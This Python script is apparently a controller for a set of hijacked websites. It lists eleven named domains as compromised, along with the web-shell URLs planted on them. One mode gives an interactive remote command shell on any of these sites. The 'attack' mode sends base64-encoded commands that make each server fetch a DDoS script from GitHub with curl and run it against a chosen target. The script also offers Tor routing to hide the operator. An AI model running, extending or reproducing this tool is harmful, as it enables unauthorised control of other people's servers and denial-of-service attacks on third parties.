#!/bin/python3

# Author: Seve
# 12/07/24

version: float = 1.0

import readline
import os
from re import match
import requests
import urllib3
from urllib3.exceptions import InsecureRequestWarning
import subprocess
import base64
import time

urllib3.disable_warnings(InsecureRequestWarning)

proxies = {
    'http': 'socks5h://localhost:9050',
    'https': 'socks5h://localhost:9050'
}

choices: list = [
	'control',
	'exit', 
	'c', 
	'attack', 
	'help', 
	'list'
	]

under: str = '\033[4m'
blue: str = '\033[94m'
white: str = '\033[97m'
default: str = '\033[0m'
activate_tor: bool = False

machines: list = [
	'https://112.199.83.110/api/phpweb.php?dcfdd5e021a869fcc6dfaef8bf31377e=', 
	'https://nir-placement.com/about.php?dcfdd5e021a869fcc6dfaef8bf31377e=', 
	'http://atsuae.net/wp-content/plugins/wpforms-lite/about.php?dcfdd5e021a869fcc6dfaef8bf31377e=', 
	'https://www.mymgimarketing.com/about.php?dcfdd5e021a869fcc6dfaef8bf31377e=', 
	'https://mgnyc.org/css/about.php?dcfdd5e021a869fcc6dfaef8bf31377e=', 
	'https://www.mylebron.cn/build.php?cmd=', 
	'https://losamigos.certifast.org/model/status.php?cmd=', 
	'https://cosmamcomsam.org/libs/css/about.php?dcfdd5e021a869fcc6dfaef8bf31377e=', 
	'https://sauyo.alriconet.com/back/bis/pages/about.php?dcfdd5e021a869fcc6dfaef8bf31377e=', 
	'https://www.shreeramrealty.com/images/about.php?dcfdd5e021a869fcc6dfaef8bf31377e=', 
	'https://obsfuneralandcremation.com/administrator/uploads/about.php?dcfdd5e021a869fcc6dfaef8bf31377e='
	]

compromised: list = [
	'112.199.83.110', 
	'nir-placement.com', 
	'atsuae.net', 
	'www.mymgimarketing.com', 
	'mgnyc.org', 
	'www.mylebron.cn', 
	'losamigos.certifast.org', 
	'cosmamcomsam.org', 
	'sauyo.alriconet.com', 
	'www.shreeramrealty.com', 
	'obsfuneralandcremation.com'
	]

def attack() -> None:
	target: str = input(f"\n{white}{under}URL->{default} ")
	time: str = input(f"{white}{under}TIME->{default} ")
	format1 = base64.b64encode(f'curl%20-s%20https://raw.githubusercontent.com/U7P4L-IN/U-DDOS/main/HTTP-RAW.js%20|%20node%20-%20{target}%20{time}'.encode('utf-8')).decode('utf-8')
	format2 = base64.b64encode(f'node%20HTTP-RAW.js%20{target}%20{time}'.encode('utf-8')).decode('utf-8')
	format3 = base64.b64encode(f'curl%20-s%20https://raw.githubusercontent.com/U7P4L-IN/U-DDOS/main/HTTP-RAW.js%20|%20./node/bin/node%20-%20{target}%20{time}'.encode('utf-8')).decode('utf-8')
	attacker: list = [
		f'https://atsuae.net/wp-content/plugins/wpforms-lite/wp-login.php?dcfdd5e021a869fcc6dfaef8bf31377e={format1}',
		f'https://www.mylebron.cn/build.php?dcfdd5e021a869fcc6dfaef8bf31377e={format2}',
		f'https://nir-placement.com/about.php?dcfdd5e021a869fcc6dfaef8bf31377e={format3}',
		f'https://atsuae.net/wp-content/plugins/wpforms-lite/wp-login.php?dcfdd5e021a869fcc6dfaef8bf31377e={format3}',
		f'https://mgnyc.org/css/about.php?dcfdd5e021a869fcc6dfaef8bf31377e={format3}',
		f'https://losamigos.certifast.org/model/status.php?dcfdd5e021a869fcc6dfaef8bf31377e={format3}',
		f'https://cosmamcomsam.org/libs/css/about.php?dcfdd5e021a869fcc6dfaef8bf31377e={format3}',
		f'https://sauyo.alriconet.com/back/bis/pages/about.php?dcfdd5e021a869fcc6dfaef8bf31377e={format3}',
		f'https://www.shreeramrealty.com/images/about.php?dcfdd5e021a869fcc6dfaef8bf31377e={format3}',
		f'https://obsfuneralandcremation.com/administrator/uploads/about.php?dcfdd5e021a869fcc6dfaef8bf31377e={format3}'
		]
	for url in attacker:
		send_attack(url)

def access(target, command) -> str:
	command = base64.b64encode(command.encode('utf-8')).decode('utf-8')
	response = requests.get(target + command, verify=False).text
	stdout = response[response.rfind('<pre>')+5:response.rfind('</pre>')]
	return stdout

def control_machine() -> None:
	print("\nSelect machine:\n")
	for j, mach in enumerate(compromised):
		print(f'     [{j+1}] {mach}')
	try:
		select: int = int(input(f'\n{white}{under}Machine-Index->{default} ')) - 1
		if select > (len(compromised) - 1):
			control_machine()
		else:
			print(f'\n{white}Type "exit" to go back.{default}\n')
			stdin: str = input(f'{white}{under}rce@{compromised[select]}->{default} ')
			print(f"\n{white}{access(machines[select], stdin)}{default}")
			while stdin != 'exit':
				stdin: str = input(f'{white}{under}rce@{compromised[select]}->{default} ')
				if stdin == 'exit':
					main()
				print(f"\n{white}{access(machines[select], stdin)}{default}")
	except ValueError:
		control_machine()

def version_check():
	print("")
	check_version = float(requests.get("https://raw.githubusercontent.com/seve02/DNH-Controller/seve/version").text)
	if version < check_version:
		update_choice = input("New version is available! Do you want to update? [Y/n] ")
		if update_choice == '' or update_choice == 'Y' or update_choice == 'y':
			os.system("cd ..;wget -q https://github.com/seve02/DNH-Controller/raw/seve/controller.zip; unzip controller.zip; rm controller.zip; cd controller")
			print("Run the script once again..")

def tor_active():
	clear()
	print("Fact: Using proxy is slow but it hides your real IP.")
	tor: str = input("Do you want to use proceed using TOR? [y/N] ")
	if tor == '' or tor == "N" or tor == "n":
		print("Proceeding without TOR...")
		time.sleep(0.2)
	elif tor == 'y' or tor == 'Y':
		activate_tor: bool = True
		subprocess.Popen("tor", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		print("Proceeding with TOR...")
		time.sleep(0.2)
	else:
		tor_active()

def send_attack(url):
	send = f'curl -k "{url}"'
	subprocess.Popen(send, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

def clear() -> None:
	os.system("clear")
	banner()

def show():
	print("\n")
	for i, domain in enumerate(compromised):
		print(f"{i+1}) {domain}")

def banner() -> None:
	print(f"""\n	    {white}- Compromised Machine Controller -{default}\n
	control - Control a selected machine.
    	attack  - Initiates a Denial of Service attack.
	exit    - Exits the program.
	list    - Shows all the machines that you have access
		""")
	print(f"      Compromised Machines:  total of {len(machines)} machines.\n")

def main() -> None:
	clear()
	while True:
		choice: str = input(f"\n{white}{under}Controller->{default} ")
		if choice in choices:
			if choice == 'control' or choice == 'c':
				control_machine()
				clear()

			elif choice == 'exit':
				exit()

			elif choice == 'help':
				banner()

			elif choice == 'attack':
				attack()

			elif choice == 'list':
				show()
		else:
			print("\n")
			os.system(choice)
			print(f"{default}")

if __name__ == '__main__':
	version_check()
	tor_active()
	main()
